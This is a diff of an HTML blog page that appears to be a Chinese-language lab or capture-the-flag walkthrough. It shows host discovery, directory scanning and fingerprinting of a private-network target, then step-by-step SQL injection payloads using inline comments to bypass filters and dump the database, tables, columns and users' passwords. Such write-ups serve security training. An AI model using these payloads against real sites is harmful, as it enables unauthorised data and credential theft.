@@ -414,12 +414,14 @@
 
 <h3 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h3><p>2.1 主机发现，发现主机<code>ip:192.168.12.163</code></p>
 <pre class="line-numbers language-none"><code class="language-none">namp 192.168.12.1&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <img src="/post/ed54/2-1.jpg" class>
 <p>2.2 发现端口80，22端口开放；对80端口进行访问</p>
 <img src="/post/ed54/2-2.jpg" class>
 
 <p>2.3 对站点目录进行扫描</p>
 <pre class="line-numbers language-none"><code class="language-none">dirsearch -u &quot;http:&#x2F;&#x2F;192.168.12.163&#x2F;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <img src="/post/ed54/2-3.jpg" class>
 
 <img src="/post/ed54/2-4.jpg" class>
@@ -428,6 +430,7 @@
 <li>4网站指纹识别</li>
 </ol>
 <pre class="line-numbers language-none"><code class="language-none">whatweb http:&#x2F;&#x2F;192.168.12.163<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <img src="/post/ed54/2-5.jpg" class>
 
 <h3 id="3-漏洞挖掘"><a href="#3-漏洞挖掘" class="headerlink" title="3. 漏洞挖掘"></a>3. 漏洞挖掘</h3><p>3.1 通过注册登录进入</p>
@@ -439,6 +442,7 @@
 <p>3.3 构造payload进行注入，爆破数据库</p>
 <pre class="line-numbers language-none"><code class="language-none">Linux%&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;database&#x2F;**&#x2F;(),&#39;2&#39;,&#39;3
 发现数据库：webapp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <img src="/post/ed54/3-2.jpg" class>
 <p>3.4 继续爆破表名，字段名，字段内的数据</p>
 <pre class="line-numbers language-none"><code class="language-none">表名：Linux%&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(table_name),&quot;2&quot;,&quot;3&quot;&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x2F;**&#x2F;like&#39;webapp
@@ -446,6 +450,7 @@
 Linux%&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(column_name),&quot;2&quot;,&quot;3&quot;&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x2F;**&#x2F;like&#x2F;**&#x2F;&#39;users
 字段内数据：
 Linux%&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(user),&#39;2&#39;,group_concat(pasword)&#x2F;**&#x2F;from&#x2F;**&#x2F;users&#x2F;**&#x2F;where&#x2F;**&#x2F;1&#x2F;**&#x2F;like&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <img src="/post/ed54/3-3.jpg" class>
 <img src="/post/ed54/3-4.jpg" class>
 <img src="/post/ed54/3-5.jpg" class>
